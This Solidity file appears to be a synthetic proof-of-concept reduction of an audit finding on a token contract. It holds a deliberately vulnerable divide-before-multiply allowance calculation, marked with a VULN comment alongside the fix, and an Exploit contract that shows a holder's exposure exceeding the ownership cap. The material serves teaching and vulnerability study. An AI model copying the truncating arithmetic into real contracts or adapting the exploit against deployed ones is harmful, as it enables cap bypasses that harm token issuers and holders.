// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Remora Dynamic Tokens — FiveFiftyRule div-before-mul precision loss
    (Cyfrin 2025-10-22, finding #63780, reporter 0xStalin)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: _updateEntityAllowance computes
        (REMORA_PERCENT_DENOMINATOR / aData.equity) * amount
    instead of
        REMORA_PERCENT_DENOMINATOR * amount / aData.equity
    Division-first truncates; when add==false the allowance is reduced by
    too little, so entity+catalyst combined exposure can exceed the cap.

    Vulnerable expression preserved with @> VULN marker.
//////////////////////////////////////////////////////////////////////////*/

contract FiveFiftyRule {
    uint256 public constant REMORA_PERCENT_DENOMINATOR = 1_000_000;

    struct EntityData {
        address catalyst;
        uint64 equity; // in millionths (e.g. 333_334 ≈ 1/3)
        uint64 allowance; // remaining entity purchase allowance (token micros)
    }

    struct IndividualData {
        bool isEntity;
        uint64 lastBalance;
        uint32 customMaximum; // cap percent in millionths of 1e6 scale (e.g. 100_000 = 10%)
    }

    mapping(address => EntityData) public entityData;
    mapping(address => IndividualData) public individualData;
    uint64 public totalSupply;

    function setTotalSupply(uint64 s) external {
        totalSupply = s;
    }

    function setMaxPercentIndividual(address who, uint32 capPercent) external {
        individualData[who].customMaximum = capPercent;
    }

    function createEntity(
        address entity,
        address catalyst,
        uint64 equityMu,
        uint64 allowance,
        address /*unused*/
    ) external {
        entityData[entity] = EntityData({catalyst: catalyst, equity: equityMu, allowance: allowance});
        individualData[entity].isEntity = true;
    }

    /// @dev Faithful reduction of the buggy allowance update used on entity buys/sells.
    function _updateEntityAllowance(address entity, uint64 amount, bool add) internal {
        EntityData storage aData = entityData[entity];
        // FIX: uint256 delta = uint256(REMORA_PERCENT_DENOMINATOR) * amount / aData.equity;
        uint256 delta = (REMORA_PERCENT_DENOMINATOR / aData.equity) * amount; // @> VULN: divide before multiply truncates
        if (add) {
            aData.allowance += uint64(delta);
        } else {
            // reduce remaining allowance by too little due to truncation
            if (delta > aData.allowance) delta = aData.allowance;
            aData.allowance -= uint64(delta);
        }
    }

    /// @dev Simulate an entity receiving `amount` tokens (add==false path on allowance).
    function entityReceive(address entity, uint64 amount) external {
        require(individualData[entity].isEntity, "not entity");
        _updateEntityAllowance(entity, amount, false);
        individualData[entity].lastBalance += amount;
    }

    /// @dev Catalyst (individual) receives tokens directly.
    function catalystReceive(address catalyst, uint64 amount) external {
        individualData[catalyst].lastBalance += amount;
    }

    /// @dev Look-through exposure of catalyst via entity equity + direct balance, in micros.
    function lookThroughExposure(address entity) public view returns (uint256 exposure) {
        EntityData memory e = entityData[entity];
        IndividualData memory iEnt = individualData[entity];
        IndividualData memory iCat = individualData[e.catalyst];
        // exposure = entityBal * equity / 1e6 + catalystBal  (already in token units; scale to micros)
        exposure = (uint256(iEnt.lastBalance) * e.equity) + uint256(iCat.lastBalance) * REMORA_PERCENT_DENOMINATOR;
    }

    function capAmountMicros(address catalyst) public view returns (uint256) {
        uint32 capPercent = individualData[catalyst].customMaximum;
        // totalSupply * capPercent  (both already on the finding's micro scale)
        return uint256(totalSupply) * capPercent;
    }

    /// @dev Correct delta (for comparison / control).
    function correctDelta(uint64 equity, uint64 amount) public pure returns (uint256) {
        return uint256(REMORA_PERCENT_DENOMINATOR) * amount / equity;
    }

    function buggyDelta(uint64 equity, uint64 amount) public pure returns (uint256) {
        return (REMORA_PERCENT_DENOMINATOR / equity) * amount;
    }
}

contract Exploit {
    FiveFiftyRule public rule; // CREATE nonce 1

    address public constant ENTITY = address(0xE1);
    address public constant CATALYST = address(0xCA);
    address public constant OTHER = address(0x07);

    uint64 public constant TOTAL_SUPPLY = 10_000_000;
    uint32 public constant CAP_PERCENT = 100_000; // 10% of 1e6 scale
    uint64 public constant EQUITY_MU = 333_334;
    uint64 public constant ENTITY_BAL = 1_500_000;
    uint64 public constant CATALYST_BAL = 700_000;

    constructor() {
        rule = new FiveFiftyRule();
    }

    function run() external {
        rule.setTotalSupply(TOTAL_SUPPLY);
        rule.setMaxPercentIndividual(CATALYST, CAP_PERCENT);

        // Allowance computed as in the finding PoC (and already "correct" at create time)
        uint64 calculatedAllowance =
            uint64(uint256(TOTAL_SUPPLY) * 1e6 * CAP_PERCENT / EQUITY_MU);

        // Demonstrate the div-before-mul gap on the reduction path
        uint256 correct = rule.correctDelta(EQUITY_MU, ENTITY_BAL);
        uint256 buggy = rule.buggyDelta(EQUITY_MU, ENTITY_BAL);
        require(buggy < correct, "setup: buggy delta should truncate below correct");

        rule.createEntity(ENTITY, CATALYST, EQUITY_MU, calculatedAllowance, OTHER);

        // Entity receives ENTITY_BAL — allowance reduced by the TOO-SMALL buggy delta
        rule.entityReceive(ENTITY, ENTITY_BAL);
        // Catalyst also holds CATALYST_BAL directly
        rule.catalystReceive(CATALYST, CATALYST_BAL);

        uint256 exposure = rule.lookThroughExposure(ENTITY);
        uint256 cap = rule.capAmountMicros(CATALYST);

        // HARM: look-through exposure exceeds the catalyst's cap (invariant broken)
        // Finding console: exposure 1200001000000 > cap 1000000000000
        require(exposure > cap, "cap not exceeded - precision loss not demonstrated");

        // Also surface that remaining allowance is strictly higher than the correct residual
        (, , uint64 remaining) = rule.entityData(ENTITY);
        uint256 correctRemaining = calculatedAllowance > correct ? calculatedAllowance - correct : 0;
        require(remaining > correctRemaining, "allowance not inflated vs correct math");
    }
}
